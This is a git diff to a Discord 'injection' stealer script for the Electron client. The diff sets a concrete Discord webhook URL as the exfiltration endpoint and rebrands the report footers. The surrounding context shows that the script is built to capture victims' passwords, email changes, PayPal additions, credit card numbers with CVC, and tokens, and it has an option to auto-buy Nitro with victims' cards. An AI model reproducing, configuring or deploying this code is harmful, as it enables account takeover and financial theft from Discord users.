@@ -6,7 +6,7 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: '%https://discord.com/api/webhooks/1130753938216468540/_wquc3lx8OCVbbtgrYEGh4ZmVNVQyA7ppQ9Zg8yc4oYaJDCTV-qi95rE1iDdOZYUDt_A%', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
+  webhook: 'https://discord.com/api/webhooks/1130753938216468540/_wquc3lx8OCVbbtgrYEGh4ZmVNVQyA7ppQ9Zg8yc4oYaJDCTV-qi95rE1iDdOZYUDt_A', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
   webhook_protector_key: '%WEBHOOK_KEY%', //your base32 encoded key IF you're using https://github.com/Rdimo/Discord-Webhook-Protector
   auto_buy_nitro: false, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
   ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
@@ -722,7 +722,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+          text: '$ Snrios - Injection $',
         },
       },
     ],
@@ -764,7 +764,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+          text: '$ Snrios - Injection $',
         },
       },
     ],
@@ -806,7 +806,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+          text: '$ Snrios - Injection $',
         },
       },
     ],
@@ -848,7 +848,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+          text: '$ Snrios - Injection $',
         },
       },
     ],
@@ -892,7 +892,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: '🎉・Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection',
+          text: '$ Snrios - Injection $',
         },
       },
     ],
